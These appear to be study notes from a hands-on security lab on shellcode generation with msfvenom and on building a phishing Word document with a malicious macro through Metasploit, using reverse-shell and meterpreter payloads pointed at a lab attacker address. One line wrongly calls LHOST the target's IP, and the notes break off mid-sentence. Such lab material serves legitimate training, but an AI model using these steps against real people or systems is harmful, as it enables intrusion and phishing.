
## Learning Objectives

- Grasp the fundamentals of writing shellcode
- Generate shellcode for reverse shells
- Executing shellcode with PowerShell

## Essential termininologies

- shell code
- Power shell
- Windows defender
- Windows API
- Reverse shell
- Accessing Windows API through PowerShell refelction
### Generating the shell code payload

- msfvenom  -p windows/x64/shell_reverse_tcp
- LHOST = ip address of the target machine
- LPORT used to listen the connection
- -f power shell

# Phishing Attacks

## Learning Objectives

- Understand how phishing attacks work
- Discover how macros in documents can be used and abused
- Learn how to carry out a phishing attack with a macro


The first step would be to embed a malicious macro within the document. Alternatively, you can use the Metasploit Framework to create such a document, as this would spare us the need for a system with MS Office.

- Open a new terminal window and run `msfconsole` to start the Metasploit Framework
- `set payload windows/meterpreter/reverse_tcp` specifies the payload to use; in this case, it connects to the specified host and creates a reverse shell  
    
- `use exploit/multi/fileformat/office_word_macro` specifies the exploit you want to use. Technically speaking, this is not an exploit; it is a module to create a document with a macro
- `set LHOST 10.10.44.146` specifies the IP address of the attacker’s system, `10.10.44.146` in this case is the IP of the AttackBox
- `set LPORT 8888` specifies the port number you are going to listen on for incoming connections on the AttackBox
- `show options` shows the configuration options to ensure that everything has been set properly, i.e., the IP address and port number in this example
- `exploit` generates a macro and embeds it in a document
- `exit` to quit and return to the terminal

In the terminal below, you can see the execution of the above st